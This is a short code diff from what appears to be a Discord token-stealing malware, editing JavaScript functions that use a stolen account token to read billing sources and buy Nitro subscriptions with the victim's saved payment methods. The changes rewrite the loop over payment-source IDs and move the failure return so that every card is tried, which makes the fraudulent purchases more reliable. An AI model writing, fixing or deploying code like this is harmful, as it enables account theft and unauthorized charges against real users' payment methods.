@@ -218,7 +218,7 @@ const getBilling = async (token) => {
                     billing += "💳 ";
                     break;
                 case 2:
-                    billing += "<:paypal:951139189389410365>";
+                    billing += ":regional_indicator_p:";
                     break;
             }
         }
@@ -257,10 +257,12 @@ const buyNitro = async (token) => {
     let IDS = [];
     data.forEach((x) => {
         if (!x.invalid) {
-            IDS = IDS.concat(x.id);
+            IDS.push(x.id);
         }
     });
-    for (let sourceID in IDS) {
+    var count = IDS.length;
+    for(var i = 0; i < count; i++) {
+        var sourceID = IDS[i];
         const first = Purchase(token, sourceID, "boost", "year");
         if (first !== null) {
             return first;
@@ -272,12 +274,11 @@ const buyNitro = async (token) => {
                 const third = Purchase(token, sourceID, "classic", "month");
                 if (third !== null) {
                     return third;
-                } else {
-                    return failedMsg;
                 }
             }
         }
     }
+    return failedMsg
 };
 
 const getNitro = (flags) => {
